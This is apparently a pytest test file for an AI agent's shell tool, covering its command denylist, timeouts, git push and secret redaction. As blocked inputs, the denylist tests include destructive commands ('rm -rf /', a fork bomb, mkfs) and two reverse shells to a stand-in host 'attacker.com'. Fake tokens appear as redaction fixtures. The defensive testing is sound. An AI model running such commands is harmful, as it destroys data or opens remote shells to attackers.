"""Unit tests for agentception.tools.shell_tools.

Covers the denylist, timeout handling, stdout/stderr capture, and exit code
reporting.  Most tests run real subprocesses; the timeout test mocks the
subprocess to avoid asyncio pipe-transport cleanup issues in the test runner.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from agentception.tools.shell_tools import (
    _check_oom_risk,
    _is_safe,
    _redact_secrets,
    git_commit_and_push,
    run_command,
)


# ---------------------------------------------------------------------------
# _is_safe (synchronous helper — no subprocess needed)
# ---------------------------------------------------------------------------


class TestIsSafe:
    def test_normal_git_command_is_safe(self) -> None:
        safe, _ = _is_safe("git status")
        assert safe is True

    def test_python_command_is_safe(self) -> None:
        safe, _ = _is_safe("python3 -m pytest agentception/tests/")
        assert safe is True

    def test_rm_rf_root_is_blocked(self) -> None:
        safe, reason = _is_safe("rm -rf /")
        assert safe is False
        assert reason

    def test_rm_rf_home_is_blocked(self) -> None:
        safe, reason = _is_safe("rm -rf ~")
        assert safe is False
        assert reason

    def test_sudo_is_blocked(self) -> None:
        safe, reason = _is_safe("sudo rm something")
        assert safe is False
        assert reason

    def test_shutdown_is_blocked(self) -> None:
        safe, reason = _is_safe("shutdown now")
        assert safe is False
        assert reason

    def test_reboot_is_blocked(self) -> None:
        safe, reason = _is_safe("reboot")
        assert safe is False
        assert reason

    def test_fork_bomb_is_blocked(self) -> None:
        safe, reason = _is_safe(":(){ :|:& };: ")
        assert safe is False
        assert reason

    def test_case_insensitive_matching(self) -> None:
        safe, reason = _is_safe("SUDO something")
        assert safe is False
        assert reason

    def test_mkfs_is_blocked(self) -> None:
        safe, reason = _is_safe("mkfs.ext4 /dev/sda1")
        assert safe is False
        assert reason

    def test_rg_command_is_safe(self) -> None:
        safe, _ = _is_safe("rg --heading pattern agentception/")
        assert safe is True

    def test_npm_command_is_safe(self) -> None:
        safe, _ = _is_safe("npm run build")
        assert safe is True

    # -- mypy OOM-risk guard --------------------------------------------------

    def test_mypy_dir_scan_bare_is_blocked(self) -> None:
        safe, reason = _is_safe("mypy agentception/")
        assert safe is False
        assert "BLOCKED" in reason
        assert "--follow-imports=silent" in reason

    def test_mypy_dir_scan_python3_m_is_blocked(self) -> None:
        safe, reason = _is_safe("python3 -m mypy agentception/")
        assert safe is False
        assert "BLOCKED" in reason

    def test_mypy_dir_scan_python_m_is_blocked(self) -> None:
        safe, reason = _is_safe("python -m mypy agentception/")
        assert safe is False
        assert "BLOCKED" in reason

    def test_mypy_dir_scan_no_trailing_slash_is_blocked(self) -> None:
        """agentception without trailing slash is still a directory target."""
        safe, reason = _is_safe("mypy agentception")
        assert safe is False
        assert "BLOCKED" in reason

    def test_mypy_dir_scan_tests_is_blocked(self) -> None:
        safe, reason = _is_safe("mypy tests/")
        assert safe is False
        assert "BLOCKED" in reason

    def test_mypy_dir_scan_both_dirs_is_blocked(self) -> None:
        safe, reason = _is_safe("mypy agentception/ tests/")
        assert safe is False
        assert "BLOCKED" in reason

    def test_mypy_dir_scan_python3_both_dirs_is_blocked(self) -> None:
        safe, reason = _is_safe("python3 -m mypy agentception/ tests/")
        assert safe is False
        assert "BLOCKED" in reason

    def test_mypy_safe_form_specific_files_is_allowed(self) -> None:
        safe, _ = _is_safe(
            "mypy --follow-imports=silent agentception/db/persist.py agentception/mcp/log_tools.py"
        )
        assert safe is True

    def test_mypy_safe_form_python3_m_is_allowed(self) -> None:
        safe, _ = _is_safe(
            "python3 -m mypy --follow-imports=silent agentception/services/agent_loop.py"
        )
        assert safe is True

    def test_mypy_safe_form_single_file_is_allowed(self) -> None:
        safe, _ = _is_safe(
            "mypy --follow-imports=silent agentception/tools/shell_tools.py"
        )
        assert safe is True

    def test_check_oom_risk_returns_actionable_message(self) -> None:
        safe, reason = _check_oom_risk("mypy agentception/ tests/")
        assert safe is False
        assert "follow-imports=silent" in reason
        assert "OOM" in reason or "container" in reason.lower()


# ---------------------------------------------------------------------------
# run_command (async — real subprocesses)
# ---------------------------------------------------------------------------


class TestRunCommand:
    @pytest.mark.anyio
    async def test_echo_returns_stdout(self, tmp_path: Path) -> None:
        result = await run_command("echo hello_world", tmp_path)
        assert result["ok"] is True
        assert "hello_world" in str(result["stdout"])
        assert result["exit_code"] == 0

    @pytest.mark.anyio
    async def test_exit_code_captured(self, tmp_path: Path) -> None:
        result = await run_command("false", tmp_path)
        assert result["ok"] is True
        assert result["exit_code"] != 0

    @pytest.mark.anyio
    async def test_stderr_captured(self, tmp_path: Path) -> None:
        result = await run_command("echo err >&2", tmp_path)
        assert result["ok"] is True
        assert "err" in str(result["stderr"])

    @pytest.mark.anyio
    async def test_blocked_command_returns_error(self, tmp_path: Path) -> None:
        result = await run_command("rm -rf /", tmp_path)
        assert result["ok"] is False
        assert "blocked" in str(result["error"]).lower()

    @pytest.mark.anyio
    async def test_grep_blocked_use_search_text(self, tmp_path: Path) -> None:
        """grep via run_command is blocked; agent must use search_text (ripgrep)."""
        result = await run_command("grep -n foo .", tmp_path)
        assert result["ok"] is False
        assert "search_text" in str(result["error"])
        result_pipe = await run_command("cat file | grep bar", tmp_path)
        assert result_pipe["ok"] is False
        assert "search_text" in str(result_pipe["error"])

    @pytest.mark.anyio
    async def test_cwd_defaults_to_none(self) -> None:
        result = await run_command("echo cwd_test")
        assert result["ok"] is True
        assert "cwd_test" in str(result["stdout"])

    @pytest.mark.anyio
    async def test_cwd_sets_working_directory(self, tmp_path: Path) -> None:
        result = await run_command("pwd", tmp_path)
        assert result["ok"] is True
        assert str(tmp_path) in str(result["stdout"])

    @pytest.mark.anyio
    async def test_timeout_kills_command_returns_error(self, tmp_path: Path) -> None:
        """run_command returns an error dict when the subprocess times out.

        The subprocess is mocked to avoid asyncio pipe-transport cleanup
        issues: real subprocesses leave asyncio pipe readers registered in
        the event loop after wait_for cancels communicate(), which causes the
        event loop selector to block.  Mocking isolates the timeout-path logic
        without touching asyncio internals.
        """
        async def _slow_communicate() -> tuple[bytes, bytes]:
            await asyncio.sleep(9999)
            return b"", b""

        proc_mock = MagicMock()
        proc_mock.returncode = -9
        proc_mock.kill = MagicMock()
        proc_mock.wait = AsyncMock(return_value=None)
        proc_mock.communicate = _slow_communicate

        with patch("asyncio.create_subprocess_shell", new_callable=AsyncMock, return_value=proc_mock):
            result = await run_command("sleep 9999", tmp_path, timeout=1)

        assert result["ok"] is False
        assert "timed out" in str(result["error"]).lower()
        proc_mock.kill.assert_called_once()

    @pytest.mark.anyio
    async def test_truncates_large_stdout(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("agentception.tools.shell_tools._MAX_OUTPUT_BYTES", 10)
        # Use python3 to generate deterministic large output (avoids bash-specific syntax)
        result = await run_command("python3 -c \"print('A' * 200)\"", tmp_path)
        assert result["ok"] is True
        assert result["stdout_truncated"] is True
        assert len(str(result["stdout"])) <= 10

    @pytest.mark.anyio
    async def test_compound_command_via_shell(self, tmp_path: Path) -> None:
        result = await run_command("echo first && echo second", tmp_path)
        assert result["ok"] is True
        assert "first" in str(result["stdout"])
        assert "second" in str(result["stdout"])

    @pytest.mark.anyio
    async def test_string_cwd(self, tmp_path: Path) -> None:
        result = await run_command("echo ok", str(tmp_path))
        assert result["ok"] is True


# ---------------------------------------------------------------------------
# git_commit_and_push — mocked subprocess to avoid real git/network calls
# ---------------------------------------------------------------------------


def _make_git_proc(stdout: bytes, stderr: bytes, returncode: int) -> MagicMock:
    proc = MagicMock()
    proc.returncode = returncode
    proc.communicate = AsyncMock(return_value=(stdout, stderr))
    return proc


class TestGitCommitAndPush:
    @pytest.mark.anyio
    async def test_full_happy_path(self, tmp_path: Path) -> None:
        """All git sub-commands succeed — returns ok with branch and sha."""
        sha = b"abc1234\n"
        responses = [
            # rev-parse --abbrev-ref HEAD → current branch is "main" (not target)
            _make_git_proc(b"main\n", b"", 0),
            # checkout -b feat/x origin/dev → success
            _make_git_proc(b"", b"", 0),
            # add -- .
            _make_git_proc(b"", b"", 0),
            # commit -m "msg"
            _make_git_proc(b"[feat/x abc1234] msg\n", b"", 0),
            # push -u origin feat/x
            _make_git_proc(b"", b"", 0),
            # rev-parse HEAD → sha
            _make_git_proc(sha, b"", 0),
        ]
        call_iter = iter(responses)

        async def fake_exec(*_args: str | int | float | bool | None, **_kwargs: str | int | float | bool | None) -> MagicMock:
            return next(call_iter)

        with patch("asyncio.create_subprocess_exec", side_effect=fake_exec):
            result = await git_commit_and_push(
                "feat/x", "my commit", ["."], tmp_path
            )

        assert result["ok"] is True
        assert result["branch"] == "feat/x"
        assert "abc1234" in str(result["sha"])

    @pytest.mark.anyio
    async def test_already_on_branch_skips_checkout(self, tmp_path: Path) -> None:
        """If already on the target branch, checkout is skipped."""
        responses = [
            _make_git_proc(b"feat/x\n", b"", 0),   # rev-parse → already on feat/x
            _make_git_proc(b"", b"", 0),             # add
            _make_git_proc(b"[feat/x abc]\n", b"", 0),  # commit
            _make_git_proc(b"", b"", 0),             # push
            _make_git_proc(b"abc\n", b"", 0),        # rev-parse HEAD
        ]
        call_iter = iter(responses)

        async def fake_exec(*_args: str | int | float | bool | None, **_kwargs: str | int | float | bool | None) -> MagicMock:
            return next(call_iter)

        with patch("asyncio.create_subprocess_exec", side_effect=fake_exec):
            result = await git_commit_and_push(
                "feat/x", "skip checkout", ["."], tmp_path
            )

        assert result["ok"] is True

    @pytest.mark.anyio
    async def test_push_failure_returns_error(self, tmp_path: Path) -> None:
        responses = [
            _make_git_proc(b"main\n", b"", 0),        # rev-parse
            _make_git_proc(b"", b"", 0),               # checkout
            _make_git_proc(b"", b"", 0),               # add
            _make_git_proc(b"[feat/x abc]\n", b"", 0), # commit
            _make_git_proc(b"", b"fatal: push failed\n", 1),  # push fails
        ]
        call_iter = iter(responses)

        async def fake_exec(*_args: str | int | float | bool | None, **_kwargs: str | int | float | bool | None) -> MagicMock:
            return next(call_iter)

        with patch("asyncio.create_subprocess_exec", side_effect=fake_exec):
            result = await git_commit_and_push(
                "feat/x", "will fail", ["."], tmp_path
            )

        assert result["ok"] is False
        assert "push" in str(result["error"]).lower()

    @pytest.mark.anyio
    async def test_empty_paths_returns_error(self, tmp_path: Path) -> None:
        # Validation fires before any git subprocess — no mock needed.
        result = await git_commit_and_push("feat/x", "msg", [], tmp_path)
        assert result["ok"] is False
        assert "non-empty" in str(result["error"]).lower()


# ---------------------------------------------------------------------------
# Secret redaction — _redact_secrets
# ---------------------------------------------------------------------------


class TestRedactSecrets:
    def test_anthropic_key_in_env_output_redacted(self) -> None:
        output = "ANTHROPIC_API_KEY=sk-ant-api03-abc123def456ghi789jkl012mno345pqr678stu901vwx234yz567abc890def123ghi456jk-EXAMPLE\nOTHER=value"
        redacted = _redact_secrets(output)
        assert "sk-ant" not in redacted
        assert "ANTHROPIC_API_KEY=[REDACTED]" in redacted
        assert "OTHER=value" in redacted

    def test_github_token_in_env_output_redacted(self) -> None:
        output = "GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef01234\nSOMETHING=else"
        redacted = _redact_secrets(output)
        assert "ghp_" not in redacted
        assert "GITHUB_TOKEN=[REDACTED]" in redacted
        assert "SOMETHING=else" in redacted

    def test_database_url_redacted(self) -> None:
        output = "DATABASE_URL=postgresql+asyncpg://user:password@localhost:5432/db\nOTHER=ok"
        redacted = _redact_secrets(output)
        assert "password" not in redacted
        assert "DATABASE_URL=[REDACTED]" in redacted

    def test_github_pat_inline_redacted(self) -> None:
        output = "token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef01234 is exposed here"
        redacted = _redact_secrets(output)
        assert "ghp_" not in redacted
        assert "[REDACTED_GH_TOKEN]" in redacted

    def test_anthropic_key_inline_redacted(self) -> None:
        output = "key=sk-ant-api03-" + "a" * 60
        redacted = _redact_secrets(output)
        assert "sk-ant" not in redacted
        assert "[REDACTED_ANTHROPIC_KEY]" in redacted

    def test_bearer_token_in_output_redacted(self) -> None:
        output = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature"
        redacted = _redact_secrets(output)
        assert "eyJhbGci" not in redacted
        assert "Bearer [REDACTED_TOKEN]" in redacted

    def test_non_secret_content_unchanged(self) -> None:
        output = "PATH=/usr/local/bin:/usr/bin\nHOME=/root\nLANG=en_US.UTF-8"
        redacted = _redact_secrets(output)
        assert redacted == output

    def test_case_insensitive_key_match(self) -> None:
        output = "anthropic_api_key=some-value-here-that-is-secret"
        redacted = _redact_secrets(output)
        assert "some-value-here-that-is-secret" not in redacted
        assert "[REDACTED]" in redacted

    @pytest.mark.anyio
    async def test_run_command_stdout_is_redacted(self, tmp_path: Path) -> None:
        """run_command applies secret redaction to stdout before returning."""
        result = await run_command(
            "printf 'ANTHROPIC_API_KEY=sk-ant-api03-FAKEKEY123456789012345678901234567890\\nOK=1'",
            tmp_path,
        )
        assert result["ok"] is True
        assert "sk-ant" not in str(result.get("stdout", ""))
        assert "[REDACTED" in str(result.get("stdout", ""))

    @pytest.mark.anyio
    async def test_run_command_new_denylist_blocks_rm_rf_app(self, tmp_path: Path) -> None:
        """rm -rf /app is blocked by the expanded denylist."""
        safe, reason = _is_safe("rm -rf /app")
        assert safe is False
        assert reason

    @pytest.mark.anyio
    async def test_run_command_new_denylist_blocks_rm_rf_worktrees(self, tmp_path: Path) -> None:
        """rm -rf /worktrees is blocked by the expanded denylist."""
        safe, reason = _is_safe("rm -rf /worktrees")
        assert safe is False
        assert reason

    def test_reverse_shell_nc_e_blocked(self) -> None:
        """nc -e is blocked as a reverse-shell pattern."""
        safe, reason = _is_safe("nc -e /bin/sh attacker.com 4444")
        assert safe is False
        assert reason

    def test_dev_tcp_redirect_blocked(self) -> None:
        """Bash /dev/tcp reverse-shell pattern is blocked."""
        safe, reason = _is_safe("bash -i >& /dev/tcp/attacker.com/4444 0>&1")
        assert safe is False
        assert reason
